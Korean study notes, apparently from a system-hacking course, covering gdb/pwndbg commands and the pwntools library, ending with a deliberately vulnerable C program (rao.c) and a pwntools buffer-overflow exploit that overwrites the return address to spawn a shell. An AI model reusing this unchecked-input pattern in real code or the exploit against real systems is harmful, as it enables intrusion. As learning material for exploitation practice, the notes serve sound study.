# tool  

## gdb  
리눅스의 대표적인 디버거  
여기서는 pwndbg 기준으로 설명할 것  
* gef: https://github.com/hugsy/gef
* peda: https://github.com/longld/peda
* pwngdb: https://github.com/scwuaptx/Pwngdb
* pwndbg: https://github.com/pwndbg/pwndbg  

### start  
리눅스는 실행파일의 형식으로 ELF(Executable and Linkable Format) 규정하고 있음  
ELF = 헤더 + 여러 섹션  
헤더: 실행에 필요한 여러 정보  
섹션: 컴파일된 기계어 코드, 프로그램 문자열을 비롯한 여러 데이터  

ELF 헤더 중 **진입점(Entry Point, EP)** 필드 있음  
운영체제는 ELF 실행할 때, 진입점의 값부터 프로그램 실행  
```readelf -h {실행파일}```  

gdb의 start 명령어는 진입점부터 프로그램을 분석할 수 있게 해줌  
DISASM 영역의 화살표가 가리키는 주소는 현재 rip 값  

### context  
프로그램은 실행되면서 레지스터를 비롯한 여러 메모리에 접근함  
pwndbg는 주요 메모리들의 상태를 프로그램이 실행되고 있는 맥락(Context)을 가독성 있게 표현할 수 있는 인터페이스 갖춤  

context는 크게 4가지 영역  
1. registers : 레지스터의 상태를 보여줌  
2. disasm : rip부터 여러 줄에 걸쳐 디스어셈블된 결과를 보여줌  
3. stack : rsp부터 여러 줄에 걸쳐 스택의 값들을 보여줌  
4. backtrace : 현재 rip에 도달할 때까지 어떤 함수들이 중첩되어 호출됐는지 보여줌  

### break & continue  
break: 특정 주소에 중단점(breakpoint) 설정하는 기능  
continue: 중단된 프로그램을 계속 실행시키는 기능  

```b {주소 혹은 *main, main+1 등 포인터}```  
```c``` 하면 continue  

### run  
start가 진입점부터 프로그램을 분석할 수 있도록 자동으로 중단점을 설정해줬다면,
run은 단순히 실행만 시킴 -> 중단점을 설정해놓지 않았다면 프로그램이 끝까지 멈추지 않고 실행됨  
(아까 main 함수에 중단점 설정해놔서 run 명령어를 실행해도 main 함수에서 실행이 멈춤)  

gdb 명령어 축약 
* b: break
* c: continue
* r: run
* si: step into
* ni: next instruction
* i: info
* k: kill
* pd: pdisas  

### disassembly  
gdb는 프로그램을 어셈블리 코드 단위로 실행하고 결과 보여줌  
프로그램의 코드는 기계어로 이뤄져 있으므로  
gdb는 기계어를 디스어셈블(Disassemble)하는 기능을 기본적으로 탑재하고 있음  
pwndgb에는 디스어셈블된 결과를 가독성 좋게 출력해주는 기능도 있음  

```disassemble main```  
함수이름을 인자로 전달하면 해당 함수가 반환될 때까지 전부 디스어셈블해서 보여줌  

u, nearpc, pdisassemble는 pwndbg에서 제공하는 디스어셈블 명령어. 디스어셈블된 코드를 가독성 좋게 출력.  

### navigate  
관찰하고자 하는 함수가 중단점에 도달했으면, 그 지점부터는 명령어를 한줄씩 자세히 분석해야함  
이때 사용하는 명령어 ni, si -> 어셈블리 명령어를 한줄 실행한다는 공통점  
call 등의 서브루틴을 호출하는 경우, ni -> 서브루틴의 내부로 들어가지 않음 / si -> 서브루틴의 내부로 들어감  

> printf가 출력하고자 하는 문자열은 stdout 버퍼에서 잠시 대기한 뒤 출력됨  
> stdout 버퍼는 특정 조건이 만족됐을 때만 데이터를 목적지로 이동시킴  
> 1. 프로그램이 종료될 때  
> 2. 버퍼가 가득 찼을 때  
> 3. fflush와 같은 함수로 버퍼를 비우도록 명시했을 때  
> 4. 개행문자가 버퍼에 들어왔을 때  

### step into  
프로그램을 분석하거나, 어떤 함수의 내부까지 궁금할 때는 si, 그렇지 않으면 ni  
context backtrace에 main 함수에서 printf를 호출했으므로 main 함수 위에 printf 함수가 쌓인 것을 볼 수 있음  

### finish  
setp into로 함수 내부에가서 필요한 부분을 모두 분석했는데  
함수의 규모가 커서 ni로는 원래 실행 흐름으로 돌아가기 어려울 경우,  
finish 명령어 사용하여 함수의 끝까지 한번에 실행  

### examine  
가상메모리에 존재하는 임의 주소의 값을 관찰 -> x 명령어  
특정 주소에서 원하는 길이만큼 데이터를 원하는 형식으로 인코딩하여 볼 수 있음  

> Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string) and z(hex, zero padded on the left). Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).  

```x/10gx $rsp``` : rsp부터 80바이트를 8바이트씩 hex 형식으로 출력  
```x/5i $rip``` : rip부터 5줄의 어셈블리 명령어 출력  
```x/s 0x400000``` : 특정 주소의 문자ㅏ열 출력  

### telescope  
pwndbg가 제공하는 강력한 메모리 덤프 기능  
특정 주소의 메모리 값들을 보여줌 + 메모리가 참조하고 있는 주소를 재귀적으로 탐색하여 값 보여줌  

```tele```  

### vmmap  
가상 메모리의 레이아웃 보여줌  
어떤 파일이 매핑된 영역일 경우, 해당 경로까지 보여줌  

```vmmap```  

### gdb/python  
gdb를 통해 디버깅할 때 직접 입력할 수 없을 때가 있음 ex. 숫자와 알파벳이 아닌 값을 입력  
-> 이용자가 직접 입력할 수 없는 값이기 때문에 파이썬으로 입력값을 생성하고, 이를 사용해야 함  

<img width="1355" alt="image" src="https://user-images.githubusercontent.com/46364778/216357980-af7d3d75-d995-4e60-b652-e03795004faa.png">  

---  

## pwntools  
간단한 프로그램에 대해서는 파이썬으로 공격 페이로드 생성, 파이프를 통해 이를 프로그램에 전달하는 방식으로 익스플로잇 수행 가능  
익스플로잇이 복잡해진다면? 익스플로잇 스크림트, 바이너리 제작하여 사용  
자주 사용하게 되는 함수: 정수를 리틀 엔디언의 바이트배열로 바꾸는 패깅 함수, 그 역을 수행하는 언패깅함수 등  
이들은 집대성 **pwntools** 라는 파이썬 모듈 제작  

* 초기 파이썬 익스플로잇 스크립트  
```
#!/usr/bin/env python2
import socket

# Remote host and port
RHOST = "127.0.0.1"
RPORT = 31337

# Make TCP connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Build payload
payload = ""
payload += "Socket script"
payload += "\n"

# Send payload
s.send(payload)

# Print received data
data = s.recv(1024)
print "Received: {0}".format(data)
```  

* pwntools 이용  
```
#!/usr/bin/python3
from pwn import *

# Make TCP connection
r = remote("127.0.0.1", 31337)

# Build payload
payload = ""
payload += "Socket script"
payload += "\n"

# Send payload
r.send(payload)

# Print received data
data = r.recv(1024)
print(f"Received: {data}")
```  

### pwntools API  
[공식문서](http://docs.pwntools.com/en/latest/)  

* process 함수 : 익스플로잇을 로컬 바이너리를 대상으로 할 때 사용하는 함수; 보통 익스플로잇을 테스트하고 디버깅하기 위해 사용  
* remote 함수 : 원격 서버를 대상으로 할 때 사용하는 함수; 보통 대상 서버를 실제로 공격하기 위해 사용  
* send : 데이터를 프로세스에 전송하기 위해 사용(send, sendline, sendafter, sendlineafter...)  
* recv: 프로세스에서 데이터를 받기 위해 사용  
recv(n)은 최대 n바이트를 받는 것, 그만큼을 받지 못해도 에러 발생 X  
recvn(n)은 정확히 n바이트의 데이터를 받지 못하면 계속 기다림  
* packing & unpacking : 리틀엔디언 바이트 배열 혹은 그 역 ex. p32, p64, u32, u64  
* interactive : 익스플로잇의 특정 상황에 직접 입력을 주면서 출력을 확인하고 싶을 때, 호출하고 나면 터미널로 프로세스에 데이터를 입력하고, 프로세스의 출력 확인할 수 있음  
* ELF : elf 헤더 객체를 이용하여 익스플로잇에 사용될 수 있는 각종 정보 활용  
* context.log : 익스플로잇에 버그발생할 경우 디버깅 돕기, 레벨은 context.log_level로 조절 가능  
* context.arch : 공격 대상의 아키텍처 정보 받기. 이 값에 따라 몇몇 함수들의 동작이 달라짐(amd64, i386, arm 등)  
* shellcraft : 제약조건이 존재하는 상황에서는 직접 셀코드 작성하도록  
[여기](https://docs.pwntools.com/en/stable/shellcraft/amd64.html)에 x86-64 대상으로 생성할 수 있는 여러 종류의 셀 코드를 찾아볼 수 있음  
* asm: 어셈블 기능. 대상 아키텍처가 중용하므로 미리 지정해야함  

#### 예제코드  
```
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};
  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];
  printf("Input: ");
  scanf("%s", buf);
  return 0;
}
```

#### 익스플로잇  
```
#!/usr/bin/python3
#Name: rao.py

from pwn import *          # Import pwntools module

p = process('./rao')       # Spawn process './rao'
get_shell = 0x4005a7       # Address of get_shell() is 0x4005a7

payload = b"A"*0x30        #|       buf      |  <= "A"*0x30
payload += b"B"*0x8        #|       SFP      |  <= "B"*0x8
payload += p64(get_shell)  #| Return address |  <= "\xa7\x05\x40\x00\x00\x00\x00\x00"

p.sendline(payload)        # Send payload to './rao'
p.interactive()            # Communicate with shell
```

```
$ python3 rao.py
[+] Starting local process './rao': pid 416
[*] Switching to interactive mode
$ id
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack) ...
```  



